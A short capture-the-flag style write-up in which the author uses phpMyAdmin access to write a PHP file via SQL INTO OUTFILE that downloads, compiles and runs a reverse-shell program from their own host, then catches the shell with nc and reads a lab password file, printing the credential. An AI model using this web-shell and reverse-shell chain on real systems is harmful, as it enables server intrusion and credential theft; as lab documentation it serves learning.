# Writeup 5 - PHP Reverse Shell 

> This writeup takes from [Writeup 1](../writeup1/README.md), having discovered `phpmyadmin` credentials.

Another variation of PHP execution, this time creating a reverse shell instead of executing a commands.

First of all, I'm starting an http server on my host machine to serve the source file:
```bash
$ python3 -m http.server 9002
Serving HTTP on 0.0.0.0 port 9002 (http://0.0.0.0:9002/) ...
```

Then, we create our trigger file (we make sure to set the IP of our host machine):
```sql
SELECT "<?php system('rm -rf /tmp/reverse-shell.c && wget http://192.168.56.1:9002/reverse-shell.c -O /tmp/reverse-shell.c && gcc /tmp/reverse-shell.c -o /tmp/reverse-shell && /tmp/reverse-shell 192.168.56.1 9001'); ?>" INTO OUTFILE '/var/www/forum/templates_c/run.php'
```

On our host, we run `nc` to listen to the port 9001:
```bash
nc -lvnp 9001
```

And finally, we visit the `run.php` file to execute our code, and we get a reverse shell:
```bash
$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 192.168.56.103 56241
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
cat /home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

We can now go back to writeup 1 and connect to `lmezard`'s account via FTP.
